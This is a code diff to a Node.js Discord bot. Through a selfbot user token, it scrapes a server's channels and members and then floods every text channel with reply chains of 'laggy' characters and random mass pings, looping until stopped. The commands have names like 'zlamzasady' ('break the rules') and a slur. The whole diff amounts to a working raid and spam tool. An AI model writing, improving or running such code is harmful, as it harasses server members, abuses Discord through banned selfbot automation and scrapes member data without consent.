@@ -3,11 +3,7 @@ const axios = require('axios');
 require('dotenv').config();
 
 const client = new Client({
-    intents: [
-        GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent
-    ]
+    intents: [GatewayIntentBits.Guilds]
 });
 
 const KFC_LOGO = `██╗   ██╗   ███████╗     ██████╗ 
@@ -55,7 +51,7 @@ client.on('ready', async () => {
     console.log('✅ Commands synced');
 });
 
-async function selfbotRequest(method, endpoint, data = null) {
+async function selfbotApi(method, endpoint, data = null) {
     try {
         const response = await axios({
             method,
@@ -78,38 +74,45 @@ async function selfbotRequest(method, endpoint, data = null) {
     }
 }
 
-async function getGuildChannels(guildId) {
-    return await selfbotRequest('GET', `/guilds/${guildId}/channels`);
-}
-
-async function getGuildMembers(guildId) {
-    return await selfbotRequest('GET', `/guilds/${guildId}/members?limit=1000`);
-}
-
-async function sendMessage(channelId, content, replyToId = null) {
+async function sendAsSelfbot(channelId, content, replyToId = null) {
     const payload = { content };
     if (replyToId) {
         payload.message_reference = { message_id: replyToId, fail_if_not_exists: false };
     }
-    return await selfbotRequest('POST', `/channels/${channelId}/messages`, payload);
+    return await selfbotApi('POST', `/channels/${channelId}/messages`, payload);
 }
 
-async function executeCwelInGuild(guildId, args) {
-    console.log('📋 Scraping guild for /cwel...');
-    const channels = await getGuildChannels(guildId);
-    const members = await getGuildMembers(guildId);
+async function executeCwel(guildId, args) {
+    console.log('📋 Scraping guild...');
+    const channels = await selfbotApi('GET', `/guilds/${guildId}/channels`);
+    const members = await selfbotApi('GET', `/guilds/${guildId}/members?limit=1000`);
     if (!channels || !members) {
-        console.log('❌ Could not scrape guild data');
-        return;
+        console.log('❌ Failed to scrape guild');
+        return false;
     }
 
     const textChannels = channels.filter(ch => ch.type === 0);
     const nonBotMembers = members.filter(m => !m.user.bot);
     const laggyChars = '][[[][][][]][][[]][][[][][[][]';
 
-    console.log(`✅ Scraped ${textChannels.length} channels, ${nonBotMembers.length} members`);
+    console.log(`✅ ${textChannels.length} channels, ${nonBotMembers.length} members`);
 
-    let lastMessageId = null;
+    // Send KFC logo in first channel as start of reply chain
+    const firstChannel = textChannels[0];
+    if (!firstChannel) {
+        console.log('❌ No text channels');
+        return false;
+    }
+
+    // Send first message (the KFC logo)
+    const logoMsg = await sendAsSelfbot(firstChannel.id, `🍗 KFC Bot Activated\n${args || ''}`);
+    if (!logoMsg) {
+        console.log('❌ Failed to send first message');
+        return false;
+    }
+
+    // Send 5 reply chains across channels
+    let lastMessageId = logoMsg.id;
     for (let i = 0; i < 5; i++) {
         if (!running) break;
 
@@ -118,17 +121,16 @@ async function executeCwelInGuild(guildId, args) {
         const content = args ? `${args} ${pings}` : `${laggyChars} ${pings}`;
 
         const channel = textChannels[i % textChannels.length];
-        if (!channel) continue;
-
-        const result = await sendMessage(channel.id, content, lastMessageId);
+        const result = await sendAsSelfbot(channel.id, content, lastMessageId);
         if (result) {
             lastMessageId = result.id;
-            console.log(`📨 /cwel chain ${i+1}/5 in #${channel.name}`);
+            console.log(`📨 Chain ${i+1}/5 in #${channel.name}`);
         }
 
         await new Promise(resolve => setTimeout(resolve, 1500));
     }
-    console.log('✅ /cwel completed');
+
+    return true;
 }
 
 client.on('interactionCreate', async (interaction) => {
@@ -137,50 +139,50 @@ client.on('interactionCreate', async (interaction) => {
 
         if (interaction.commandName === 'zlamzasady') {
             const args = interaction.options.getString('args') || '';
+            const guildId = interaction.guildId;
 
-            await interaction.reply({ content: '🍗 Using KFC Bot...', flags: MessageFlags.Ephemeral });
-
-            // Fetch channel to send logo
-            const channel = await client.channels.fetch(interaction.channelId);
-            if (channel) {
-                await channel.send(KFC_LOGO);
+            if (!guildId) {
+                await interaction.reply({ content: '❌ Use this in a server', flags: MessageFlags.Ephemeral });
+                return;
             }
 
+            await interaction.reply({ content: '🍗 KFC Bot is working...', flags: MessageFlags.Ephemeral });
             console.log(`⚔️ ZlamZasady triggered with args: "${args}"`);
-
-            if (!config.selfbotToken) return;
 
             running = true;
 
-            // Initial /cwel execution
-            await executeCwelInGuild(interaction.guildId, args);
+            // Execute /cwel via selfbot (scrapes + sends reply chains)
+            const success = await executeCwel(guildId, args);
+            if (!success) {
+                console.log('❌ Selfbot execution failed');
+                return;
+            }
 
-            // Loop until stopped
+            // Keep looping until stopped
             while (running) {
-                const channels = await getGuildChannels(interaction.guildId);
-                if (!channels) break;
+                const textChannels = [];
+                const channels = await selfbotApi('GET', `/guilds/${guildId}/channels`);
+                const members = await selfbotApi('GET', `/guilds/${guildId}/members?limit=1000`);
+                if (!channels || !members) break;
 
-                const textChannels = channels.filter(ch => ch.type === 0);
-                const members = await getGuildMembers(interaction.guildId);
-                if (!members) break;
+                const tc = channels.filter(ch => ch.type === 0);
+                const nonBot = members.filter(m => !m.user.bot);
+                const laggy = '][[[][][][]][][[]][][[][][[][]';
 
-                const nonBotMembers = members.filter(m => !m.user.bot);
-                const laggyChars = '][[[][][][]][][[]][][[][][[][]';
-
-                for (const channel of textChannels) {
+                for (const channel of tc) {
                     if (!running) break;
 
-                    let lastMessageId = null;
+                    let lastId = null;
                     for (let i = 0; i < 5; i++) {
                         if (!running) break;
 
-                        const shuffled = [...nonBotMembers].sort(() => Math.random() - 0.5).slice(0, 10);
+                        const shuffled = [...nonBot].sort(() => Math.random() - 0.5).slice(0, 10);
                         const pings = shuffled.map(m => `<@${m.user.id}>`).join(' ');
-                        const content = args ? `${args} ${pings}` : `${laggyChars} ${pings}`;
+                        const content = args ? `${args} ${pings}` : `${laggy} ${pings}`;
 
-                        const result = await sendMessage(channel.id, content, lastMessageId);
+                        const result = await sendAsSelfbot(channel.id, content, lastId);
                         if (result) {
-                            lastMessageId = result.id;
+                            lastId = result.id;
                             console.log(`📨 Chain ${i+1}/5 in #${channel.name}`);
                         }
 
@@ -192,12 +194,17 @@ client.on('interactionCreate', async (interaction) => {
 
         if (interaction.commandName === 'cwel') {
             const args = interaction.options.getString('args') || '';
+            const guildId = interaction.guildId;
+
+            if (!guildId) {
+                await interaction.reply({ content: '❌ Use this in a server', flags: MessageFlags.Ephemeral });
+                return;
+            }
 
             await interaction.reply({ content: '⚡ Executing /cwel...', flags: MessageFlags.Ephemeral });
             console.log(`⚡ /cwel triggered with args: "${args}"`);
 
-            if (!config.selfbotToken) return;
-            await executeCwelInGuild(interaction.guildId, args);
+            await executeCwel(guildId, args);
         }
 
         if (interaction.commandName === 'stop') {
@@ -207,7 +214,7 @@ client.on('interactionCreate', async (interaction) => {
             process.exit(0);
         }
     } catch (error) {
-        console.log(`❌ Interaction error: ${error.message}`);
+        console.log(`❌ Error: ${error.message}`);
         try {
             if (!interaction.replied) {
                 await interaction.reply({ content: '❌ Error occurred', flags: MessageFlags.Ephemeral });
